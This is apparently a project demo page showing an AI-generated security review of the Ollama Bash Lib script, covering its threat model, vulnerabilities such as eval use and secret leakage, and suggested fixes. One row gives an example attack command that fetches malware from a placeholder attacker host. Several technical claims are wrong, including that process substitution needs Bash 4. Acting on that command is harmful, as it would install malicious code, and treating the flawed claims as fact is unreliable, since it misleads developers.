# Security Review of [ollama_bash_lib.sh](../ollama_bash_lib.sh)

A [demo](../README.md#demos) of [Ollama Bash Lib](https://github.com/attogram/ollama-bash-lib) v0.44.8


```bash
task="Act as an Expert Security Professional.
Do a Security Review of this bash script.
Require that script works in Bash v3.2 or higher.
Output your review in Markdown format."
file="../ollama_bash_lib.sh"
ollama_thinking hide
ollama_generate "gpt-oss:20b" "$task\n\n$(cat "$file")"
```
# Security Review of **Ollama Bash Lib (v0.44.8)**  
> Bash ≥ 3.2 required

Below is a **security‑centric analysis** of the source code.  The focus is on  
* potential injection or privilege‑escalation vectors,  
* information‑leak concerns,  
* unsafe handling of secrets, and  
* general robustness/compatibility issues that may reduce security posture.

---

## 1. Threat Model

| Attacker | Capabilities | Desired Goal | Script‑Related Context |
|----------|--------------|--------------|------------------------|
| **Local adversary** | OS user on the same host, root access (or can influence PATH) | Escape from sandboxed scripts, read/write arbitrary files | Script relies on external tools (`curl`, `jq`, `ollama`) – path tampering can turn them into malicious binaries. |
| **Compromised host** | Full system control | Dump secrets stored in environment, intercept API traffic | `OLLAMA_LIB_TURBO_KEY`, `OLLAMA_HOST` may be exposed in logs or child processes. |
| **Remote user** | Sends JSON payloads (via a model call) | Cause command injection, read secrets | Tool definitions are executed via `ollama_tools_run`. |
| **Supply‑Chain attacker** | Modifies the library before deployment | Inject malicious code, alter logic | No integrity check (hash/ signature). |

The library is *not* hardened against a malicious user who can tamper with environment variables or installed binaries.  It is designed for **trusted contexts** (local scripts that call the library).  Nevertheless, the following vulnerabilities/risks are worth addressing.

---

## 2. Identified Vulnerabilities & Issues

| # | Function / Feature | Vulnerability | Impact | Remediation / Mitigation |
|---|--------------------|---------------|--------|--------------------------|
| 1 | **_get_redacted_var** | Indirect expansion (`${!var_name}`) accepts any string. If an untrusted user supplies a name containing a space or `;`, the expansion may fail or expose unintended data. | Variable injection; accidental disclosure of other env vars. | Sanitize `var_name` to a safe glob (`^[A-Za-z_][A-Za-z0-9_]*$`). Return error if pattern fails. |
| 2 | **Command execution** (`ollama_tools_run`, `ollama_eval`) | Arbitrary commands can be executed with root privileges (if the script is run as root). `eval "$cmd"` is executed **without any sandbox** after user confirmation. | Remote code execution. | Do **not** expose `eval` in production. Use explicit command whitelists or a sandbox (e.g., `sandbox.sh` with `chroot`, `seccomp`, or `pwrite`). |
| 3 | **Environment leaking** | `OLLAMA_LIB_TURBO_KEY` is exported if the user chooses `-e`.  This leaks the key to any child process (e.g., `wget`, `curl`) and to the audit trail. | Credential theft. | Store the key in a **process‑private variable** (do not export). Use `export -n OLLAMA_LIB_TURBO_KEY` to unexport. If export is necessary, add a warning. |
| 4 | **Logging & redaction** (`_debug`, `_redact`) | Redaction replaces only `OLLAMA_LIB_TURBO_KEY`.  Any other secret (e.g., `OLLAMA_AUTH`) is printed raw in debug logs. | Information leakage in logs or stdout. | Enhance redaction: maintain a list of known secret variables and strip them. Prefer `printf '[REDACTED]'`.|
| 5 | **URL validation** (`_is_valid_url`) | Regex accepts `http://example.com/path?query`.  It does not enforce https.  A malicious actor could point the library at an insecure endpoint. | Man‑in‑the‑middle or data exfiltration. | In turbo mode: enforce `https://` or at least warn if using `http://`. |
| 6 | **Input validation** (`ollama_tools_run`, `ollama_messages_add`) | No validation that the command or JSON payload is *safe*.  A user can embed malicious code in the `definition`. | E.g., `curl http://attacker.com/malware` triggered automatically. | Whitelist allowed tools or validate that the command exists in a safe path (`/usr/bin`, `/usr/local/bin`). Reject tool definitions that contain prohibited characters (`;`, `|`, `&&`, `>`).|
| 7 | **Use of `eval` inside `_is_valid_json`** | `jq -e '.'` is safe; no eval. However, `jq` might be replaced with a malicious binary (see #1). | Command injection if PATH is manipulated. | Verify the location of `jq` (`which jq` or `type -p jq`). |
| 8 | **Process substitution** (`2> >( _ollama_thinking_stream )`) | Requires Bash 4+; will fail on older shells, potentially causing script to exit unexpectedly in privileged contexts. | Denial‑of‑service (script stops). | Detect Bash version (`${BASH_VERSINFO[0]}`) and provide a fallback or explicit error. |
| 9 | **JSON building** | The script uses `jq` for JSON construction, which is robust.  However, the raw string concatenation in `ollama_list_array` could introduce newlines that break data handling if a model name contains newline (unlikely). | Data corruption. | Validate model names (`^[a-zA-Z0-9._:/-]+$`) before storing. |
|10 | **Race condition on `ollama list`** | The script runs `ollama list` and then randomly selects a model with `shuf`.  An attacker could modify the `ollama` binary between the two calls, causing a different model list. | Model selection may be unpredictable, but not a direct breach. | Use a single API call (`/_api/tags`) if possible. |
|11 | **Path traversal** | User can set `OLLAMA_HOST` to a path that resolves to a local UNIX socket in a directory the user can write to, leading to local impersonation. | Local spoofing. | Enforce that `OLLAMA_HOST` is a hostname/service or a valid HTTPS URL; reject `/` paths. |
|12 | **Sensitive output to stdout** | Many functions, e.g., `ollama_lib_about`, echo environment variables such as `OLLAMA_HOST`, `OLLAMA_MAX_VRAM`, etc. | Information disclosure to the console. | Provide a `--quiet` flag or separate a “public” and “private” info set. |

---

## 3. General Security Recommendations

| Area | Action | Rationale |
|------|--------|-----------|
| **Secret handling** | 1. Never export cryptographic secrets to environment. Instead, keep them in a Bash variable scoped to the script. 2. If export is required, unexport immediately after the child command (`export -n VAR`). | Prevents leakage to child processes, audit logs, and other users. |
| **Command sanitization** | Whitelist all executable binaries that can be launched by the library.  Prefer full paths (`/usr/bin/curl`) and verify with `command -v`. | Stops an attacker from inserting malicious binaries of the same name in a custom `PATH`. |
| **Input validation** | Validate all user‑supplied strings (command names, JSON payloads, model names) against strong regexes. Reject strings with shell‑special characters like `;|&<>*?`. | Avoids accidental or intentional injection of shell metacharacters. |
| **Runtime checks** | Detect Bash ≥ 4 before using process substitution; use an explicit check:

```bash
if (( ${BASH_VERSION%%.*} < 4 )); then
  _error "Process substitution requires Bash 4+. Falling back."
fi
```

| Prevents accidental exit. |
| **Logging** | All debug logs must pass through a sanitization routine that strips or masks known secrets.  Ideally, include a separate, configurable “masker” list. | Reduces accidental credential leakage. |
| **Transport security** | Enforce HTTPS for all outgoing API calls.  In turbo mode, abort if the URL is not `https://`. | Protects against MITM. |
| **Safe mode** | Consider extending `OLLAMA_LIB_SAFE_MODE` to prevent any command execution (`eval`, tool invocation, etc.) in untrusted contexts. | Gives a safeguard that can be toggled on by the user. |
| **Integrity** | Optionally provide a checksum/sha256 of the library distribution.  Users can verify before usage. | Detect tampering in supply chain. |
| **Error handling** | Do not print stack traces or raw error messages to the user.  Instead redirect full error output to a log file or `/dev/stderr` with minimal context. | Helps avoid leaking internal variable names or file paths. |

---

## 4. Compatibility Notes

| Feature | Bash 3.2 Support? | Comments |
|---------|-------------------|----------|
| `local` variables | Yes | Works in all shells. |
| `${var:offset:length}` | Yes | Supported from 3.2 onward. |
| `printf '%s'` | Yes | Works. |
| Process substitution (`>(...)`) | **No** | Only Bash 4+.  The script will fail silently or exit on Bash 3.2.  Provide a fallback or explicit error. |
| Array expansion with `IFS` | Yes | 3.2 supports array syntax. |
| `read -r -n 1` | Yes | Works. |
| `date '+%N'` | No | `date` may not support nanoseconds; script falls back to `date '+%H:%M:%S'`. Correct. |
| `printf '%s\n' "$result"` | Yes | Works. |
| `trap` usage | Not present | None. |
| `export OLLAMA_HOST` | Yes | Sets variable. |
| `(( expression ))` | Yes | Works. |
| `return $?` inside functions | Yes | Works. |

---

## 5. Summary

The **Ollama Bash Lib** is a functional wrapper around the Ollama API.  From a security standpoint it is **acceptable for trusted, local use** but not hardened for production deployments where untrusted input or an untrusted environment is a concern.

Key weaknesses are:

* **Uncontrolled command execution** (`ollama_eval`, `ollama_tools_run`).
* **Leaky environment variables** (`OLLAMA_LIB_TURBO_KEY`, other secrets).
* **Inconsistent secret redaction**.
* **Potential misuse of user‑supplied data** (no strict validation of model names, tool definitions, or commands).
* **Process substitution compatibility** with Bash 3.2.

Addressing these points will make the script robust against local attacks, mitigate accidental privilege escalation, and safeguard credentials.  Implementing the above mitigations will elevate the library’s security posture while preserving its core functionality.
